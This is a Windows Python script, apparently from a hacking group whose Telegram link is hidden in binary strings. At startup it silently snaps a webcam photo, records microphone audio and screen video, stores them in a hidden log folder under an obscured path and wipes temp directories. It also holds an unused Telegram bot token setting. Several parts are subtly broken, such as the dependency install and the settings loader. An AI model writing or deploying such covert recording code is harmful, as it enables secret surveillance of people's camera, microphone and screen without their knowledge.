try :
    import time
    import os
    import shutil
    import json
    import sounddevice as sd
    import soundfile as sf
    from win10toast import ToastNotifier
    import cv2
    import pyautogui
    import numpy as np
    import threading
    import subprocess
    from datetime import datetime
except ModuleNotFoundError as Error:
    os.system('start  /wait cmd')
    from subprocess import call
    call("pip install " + ' '.join(Error.name), shell=True)
    os.system('cmd /c "color 3"')
    os.system('cmd /c "cls"')

def Load_Data_Setting(ret = "str"):
    global DefaultSetting
    DefaultSetting = {
        "Audiu" : {
            "Ra" : "True",
            "TRa" : "180",
        },
        "screen" : {
            "Rs" : "True",
            "TRs" : "180",
        },
        "Camera" : {
            "G" : "True",
        },
        "startup" : {
            "Ls" : "True",
        },
        "Delete" : {
            "De" : "True",
        },
        "TelBot" : {
            "Tb" : "False",
            "ID" : "1234567890",
            "API": "1234567890:AAHYdFETSH5JKduIUfrLzqffdsGMkJl_0G0"
        },
        "Folder" : {
            "Dir":"C:/LOG_Program_Cactus_Black",
        }
    }
    def Create():
        file_Setting = open(''.join([chr(value) for value in [67,
            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
            95, 66, 108, 97, 99, 107]]),"w")
        json.dump(DefaultSetting, file_Setting, indent=4)
        file_Setting.close()
        file_Setting = open(''.join([chr(value) for value in [67,
            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
            95, 66, 108, 97, 99, 107]]),"r")
    try:
        file_Setting = open(''.join([chr(value) for value in [67,
            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
            95, 66, 108, 97, 99, 107]]),"r")
        # Scan File Setting For Check Data
        file_Data = file_Setting.read()
        All = ["Audiu","Ra","TRa","screen","Rs","TRs","Camera",
               "G","startup","Ls","Delete","De","TelBot","Tb",
               "ID","API","Folder","Dir"]
        Scan = file_Data.split('"')
        for i in Scan :
            for One in All :
                if One == i : All.remove(One)
        if All != [] : Create()
    except:
        Create()
    if ret == "str" :
        return file_Setting.read()
    elif ret == "List":
        return json.loads(file_Data)

def Install_Program(Folder_ROOT="C:/"):
    if "LOG_Program_Cactus_Black" not in os.listdir(Folder_ROOT) :
        os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black")
    if "Setting.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        Load_Data_Setting()
    if "Install.ini" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        Install = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"Install.ini", "w")
        Install.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
        Install.close()
    if "License.ini" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        License = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"License.ini", "w")
        License.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
        License.close()
    if "TimeLog.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        TimeLog = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"TimeLog.Cactus_Black", "w")
        TimeLog.close()
    if "ErrorLog.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        ErrorLog = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"ErrorLog.Cactus_Black", "w")
        ErrorLog.close()
    if "DataBase.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        DataBase = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"DataBase.Cactus_Black", "w")
        DataBase.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
        DataBase.close()
    if "ScreenRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"ScreenRecords")
    if "AudiuRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"AudiuRecords")
    if "CameraRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"CameraRecords")
        os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"AudiuRecords")
    if "CameraRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
        os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"CameraRecords")

    subprocess.run(f'attrib +h "{Folder_ROOT+"LOG_Program_Cactus_Black/"+"Install.ini"}"', cwd='C:\Windows\system32', shell=True)
    subprocess.run(f'attrib +h "{Folder_ROOT+"LOG_Program_Cactus_Black/"+"License.ini"}"', cwd='C:\Windows\system32', shell=True)
    subprocess.run(f'attrib +h "{Folder_ROOT+"LOG_Program_Cactus_Black/"+"Setting.Cactus_Black"}"', cwd='C:\Windows\system32', shell=True)

Install_Program()

def Record_Sund_and_Screen_File(Time_A, Time_S, Folder):
    # Ensure the directories exist
    audio_dir = os.path.join(Folder, "AudiuRecords")
    video_dir = os.path.join(Folder, "ScreenRecords")

    # Generate valid filenames
    timestamp = time.strftime("%Y_%m_%d_T_%H_%M")
    audio_filename = os.path.join(audio_dir, f"recorded_audio_{timestamp}.wav")
    video_filename = os.path.join(video_dir, f"screen_recording_{timestamp}.mp4")

    def record_audio():
        try:
            audio = sd.rec(int(Time_A * 44100), samplerate=44100, channels=2, dtype='int16')
            sd.wait()
            sf.write(audio_filename, audio, 44100)  # Save File
        except Exception as e:
            None

    def record_screen():
        try:
            fps = 10.0  # FPS
            resolution = pyautogui.size()
            fourcc = cv2.VideoWriter_fourcc(*"mp4v")
            video_writer = cv2.VideoWriter(video_filename, fourcc, fps, resolution)

            start_time = time.time()
            End =  start_time + Time_S
            while time.time() < End:
                img = pyautogui.screenshot()
                frame = np.array(img)  # Set Image to List
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                mouse_x, mouse_y = pyautogui.position()
                cv2.circle(frame, (mouse_x, mouse_y), 10, (0, 0, 255), -1)  # Drawing a mouse with a red dot
                video_writer.write(frame)
                time.sleep(0.4 / fps)

            video_writer.release()
        except Exception as e:
            None

    Log = ""
    try:
        # Start both threads simultaneously
        if Time_A > 0 :
            audio_thread = threading.Thread(target=record_audio)
            audio_thread.start()
            # Optionally, wait for both threads to finish if needed
            audio_thread.join()
            Log = "No Error :)"
        else :
            Log = "Is Off :)"
        # Start both threads simultaneously
        if Time_S > 0 :
            screen_thread = threading.Thread(target=record_screen)
            screen_thread.start()
            # Optionally, wait for both threads to finish if needed
            screen_thread.join()
            Log = Log+" | No Error :)"
        else :
            Log = Log+" | Is Off :)"

        return Log
    except Exception as e:
        return f"Get Error!!: {e}"

def Record_Camera_File(Folder):
    # Open Camera
    cap = cv2.VideoCapture(0)
    Activ = False

    if not cap.isOpened():
        return "Error: Could not open camera."
    # Try to read a frame from the camera
    ret, frame = cap.read()
    if ret:
        # Generate a unique filename using the current timestamp
        filename = Folder+"/CameraRecords/Camera_" + str(time.strftime("%Y_%m_%d_T_%H_%M")) + ".jpg"
        # Save the captured frame as an image file
        if cv2.imwrite(filename, frame):
            Activ = True
    # Release the camera and close the window
    cap.release()
    cv2.destroyAllWindows()

    if Activ:
        return "No Error :)"
    else:
        return "Get Error!!!"

def clear_temp():
    E = ""
    temp_dir = [os.getenv('TEMP') or os.getenv('TMP'), "C:/Windows/Temp"]
    for i in range(0,len(temp_dir)):
        try:
            if temp_dir[i] and os.path.exists(temp_dir[i]):
                for root, dirs, files in os.walk(temp_dir[i]):
                    for file in files:
                        try:
                            os.remove(os.path.join(root, file))
                        except Exception as e:
                            pass
                    for dir in dirs:
                        try:
                            shutil.rmtree(os.path.join(root, dir))
                        except Exception as e:
                            pass
        except:
            E = "Error!"

    if E == "" : return "No Error :)"
    if E != "" : return "Get Error!!"

# Get Setting
Setting =  {
    "Audiu" : {
        "Ra" : Load_Data_Setting("List")["Audiu"]["Ra"],
        "TRa" : Load_Data_Setting("List")["Audiu"]["TRa"],
    },
    "screen" : {
        "Rs" : Load_Data_Setting("List")["screen"]["Rs"],
        "TRs" : Load_Data_Setting("List")["screen"]["TRs"],
    },
    "startup" : {
        "Ls" : Load_Data_Setting("List")["startup"]["Ls"],
    },
    "Camera" : {
        "G" : Load_Data_Setting("List")["Camera"]["G"],
    },
    "Delete" : {
        "De" : Load_Data_Setting("List")["Delete"]["De"],
    },
    "TelBot" : {
        "Tb" : Load_Data_Setting("List")["TelBot"]["Tb"],
        "ID" : Load_Data_Setting("List")["TelBot"]["ID"],
        "API": Load_Data_Setting("List")["TelBot"]["ID"],
    },
    "Folder" : {
        "Dir":Load_Data_Setting("List")["Folder"]["Dir"],
    }
}

# Create Back Data
SystemAdress = "C:/LOG_Program_Cactus_Black"
Back_FILE_T = ""
Back_FILE_E = ""
# Get Back Data Start Windows
try:
    file = open(Setting["Folder"]["Dir"]+"/TimeLog.Cactus_Black","r")
    Back_FILE_T = file.read()
except :
    Create = open(Setting["Folder"]["Dir"]+"/TimeLog.Cactus_Black","w")
    Create.close()
try:
    file = open(SystemAdress+"/ErrorLog.Cactus_Black","r")
    Back_FILE_E = file.read()
except :
    Create = open(SystemAdress+"/ErrorLog.Cactus_Black","w")
    Create.close()

# Save Log
if Setting["startup"]["Ls"] == "True" :
    W_file = open(Setting["Folder"]["Dir"]+"/TimeLog.Cactus_Black","w")
    W_file.write(Back_FILE_T+"time start Sys is : "+str(time.strftime( "%Y / %m / %d , %H:%M:%S"))+"\n")
    W_file.close()
# Get Data
if Setting["Camera"]["G"] == "True" :
    Camera = Record_Camera_File(Setting["Folder"]["Dir"])
else : Camera = "OFF :|"
if Setting["Audiu"]["Ra"] == "True" and Setting["screen"]["Rs"] == "True" :
    Screen_and_sund  = Record_Sund_and_Screen_File(int(Setting["Audiu"]["TRa"]), int(Setting["screen"]["TRs"]), Setting["Folder"]["Dir"])
else : 
    if Setting["Audiu"]["Ra"] == "False" : Screen_and_sund = Record_Sund_and_Screen_File(0, int(Setting["screen"]["TRs"]), Setting["Folder"]["Dir"])
    elif Setting["screen"]["Rs"] == "False" : Screen_and_sund = Record_Sund_and_Screen_File(int(Setting["Audiu"]["TRa"]), 0, Setting["Folder"]["Dir"])
    else : Screen_and_sund = "Is Off :) | Is Off :)"

if Setting["Delete"]["De"] == "True" :
    clear_temps_file_Log = clear_temp()
else : clear_temps_file_Log = "OFF :|"
# Save Errors
Errors = f"Errors {time.strftime('%Y / %m / %d , %H:%M:%S')} is : \nErrors Record Camera : {Camera}\nErrors Record Screen & Sund : {Screen_and_sund}\nErrors Remove Temp Files : {clear_temps_file_Log}\n------------------\n"
W_file = open(SystemAdress+"/ErrorLog.Cactus_Black","w")
W_file.write(Back_FILE_E+Errors)
W_file.close()
# Show Notife End
toast = ToastNotifier()
masege = ("Hi Welcom King!")
toast.show_toast("Welcome!",masege,duration = 5,threaded = True)
